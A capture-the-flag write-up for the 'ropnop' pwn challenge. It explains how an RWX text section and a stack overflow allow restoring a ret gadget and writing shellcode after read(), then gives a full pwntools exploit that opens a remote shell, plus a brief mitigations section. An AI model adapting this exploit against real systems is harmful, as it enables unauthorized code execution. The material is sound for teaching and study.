# ropnop

**Author**: `Managarmr`

## Table of Contents

1. [Challenge](#1-challenge)
2. [Having a look](#2-having-a-look)
3. [Restoring the shop](#3-restoring-the-shop)
4. [Final exploit](#4-final-exploit)
5. [Mitigations](#5-mitigations)

## 1. Challenge

**Category**: `Pwn`  
**Difficulty**: `Medium`  
**Author**: `Flo`  
**Attachments**: [ropnop](https://static.allesctf.net/challenges/eb61fbc445d3a645f91a92b0a8914a487bc3589d5b5bbe4221e48be0db6333b1/ropnop)
[ropnop.c](https://static.allesctf.net/challenges/40a62691855af0000749c9aff5f917eeaed9d19c16c3b61038d32a067c081e8d/ropnop.c)  
**Description**:

I heard about this spooky exploitation technique called
[ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) recently.

These haxxors don't know who they're dealing with though. With ropnop™, I made
sure that nobody can exploit my sketchy C code!

Here's a demo:

`nc hax1.allesctf.net 9300`

## 2. Having a look

In this pwning challenge we are provided with the source code, so let's just
have a look at it first. There's an interesting function called `gadget_shop`:

```c
void gadget_shop() {
	// look at all these cool gadgets
	__asm__("syscall; ret");
	__asm__("pop %rax; ret");
	__asm__("pop %rdi; ret");
	__asm__("pop %rsi; ret");
	__asm__("pop %rdx; ret");
}
```

It appears as if it was placed there in order to taunt us, but we don't really
care as it's putting some really nice gadgets for us to use in a `ROP` attack.

There are only two other function which do anything useful, one of them being
`ropnop`, which `mprotect`s the `text` section and replaces all `ret`
instructions with `nop`s. Well not really what it _really_ does is replace all
`0xc3` bytes with `0x90`, which happen to encode `ret` and `nop`, but apply to
more as well - addresses, constants, etc.

```c
void ropnop() {
	unsigned char *start = &__executable_start;
	unsigned char *end = &etext;
	printf("[defusing returns] start: %p - end: %p\n", start, end);
	mprotect(start, end-start, PROT_READ|PROT_WRITE|PROT_EXEC);
	unsigned char *p = start;
	while (p != end) {
		// if we encounter a ret instruction, replace it with nop!
		if (*p == 0xc3)
			*p = 0x90;
		p++;
	}
}
```

The function is also nice enough to defeat ASLR by printing the address of the
`text` section for us.

The last function just let's us overwrite the stack without any hassle:

```c
int main(void) {
	init_buffering();
	ropnop();
	int* buffer = (int*)&buffer;
	if (read(0, buffer, 0x1337) < 0)
		puts(strerror(errno));
	return 0;
}
```

## 3. Restoring the shop

The `ropnop` function essentially makes the shop useless for us as we need some
`ret`s in there. So let's restore it. Looking at the disassembly of `main` we
can see that we are able to write `%rax` into any memory location we like:

```
    12cf:       e8 6c fd ff ff          callq  1040 <read@plt>
    12d4:       31 c9                   xor    %ecx,%ecx
    12d6:       48 89 45 e8             mov    %rax,-0x18(%rbp)
    12da:       89 c8                   mov    %ecx,%eax
    12dc:       48 83 c4 20             add    $0x20,%rsp
    12e0:       5d                      pop    %rbp
    12e1:       c3                      retq
```

In order to do this, we only need to overwrite the stack in such a way that
`%rbp` will be populated with the target address + `0x18` and return for a
second `read` call as the buffer address (`%rsi`) itself is not modified.

This only works because the `text` section is still `RWX`, but it still works.
So what to fix is the real question? Well this depends on the approach we want
to take, do we want to use the `syscall` instruction in the binary? Well it's
one possible option, but there is a much easier one: As we can use `read` and
the `text` section is `RWX`, why not just adjust `%rsi` in order to write our
shellcode directly after the `read`?

## 4. Final exploit

Doing just that will let us obtain a shell trivially.

The full exploit looks like this:

```python
#!/usr/bin/env python3
from pwn import *

# Setup
context(arch='amd64')

# Target definition
target = remote('hax1.allesctf.net', 9300)
# target = process("./ropnop")

FIXME_RET_OFFSET = 0x11ec # retq after "pop %rsi"
WRITE_RAX_OFFSET = 0x12d6 # write
SHELLCODE_OFFSET = 0x12d4 # main() after read
POP_RSI_OFFSET = 0x11eb
SYSCALL_OFFSET = 0x11e4
READ_OFFSET = 0x12cf

addresses = target.recvline_contains(b'start: ')
base = int(addresses.split(b':')[1][3:15], 16)

# Setup to fix the broken ret
# (set rbp so that mov eax, -0x18(%rbp) will set it to 0xc3)
# and setup to read again
payload_1 = (b'x'*16 +
	p64(base + FIXME_RET_OFFSET + 0x18) +
	p64(base + READ_OFFSET))

# Fix the broken ret and push the correct buffer address for the syscall
# Filler of 0x28 in read()
payload_2 = (b'x'*24 +
	p64(base + WRITE_RAX_OFFSET) +
	b'x'*0x28 +
	p64(base + POP_RSI_OFFSET) +
	p64(base + SHELLCODE_OFFSET) +
	p64(base + READ_OFFSET))
payload_2 += b'x' * (0xc3 - len(payload_2) - 1)

# The actual shellcode
payload_3 = asm(shellcraft.sh())

sleep(0.1)
target.sendline(payload_1)
sleep(0.1)
target.sendline(payload_2)
sleep(0.1)
target.sendline(payload_3)
sleep(0.1)
target.interactive()
```

Running it provides the following output:

```
$ ./solve.py
[+] Opening connection to hax1.allesctf.net on port 9300: Done
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag
meme.jpg
ropnop
ynetd
$ cat flag
CSCG{s3lf_m0d1fy1ng_c0dez!}
$ 
```

Thus earning us the flag: `CSCG{s3lf_m0d1fy1ng_c0dez!}`

## 5. Mitigations

In order to mitigate this exploit, one should never leave sections marked as
`RWX` - I mean what is this? 1990? Also `ASLR` exists for a reason - don't just
happily hand out base addresses. Being careful of buffer overflows would also
help, but I believe this to be a mute point, as anyone integrating a `read` call
like this in non-ctf binaries is either of questionable sanity or sick of their
job :).
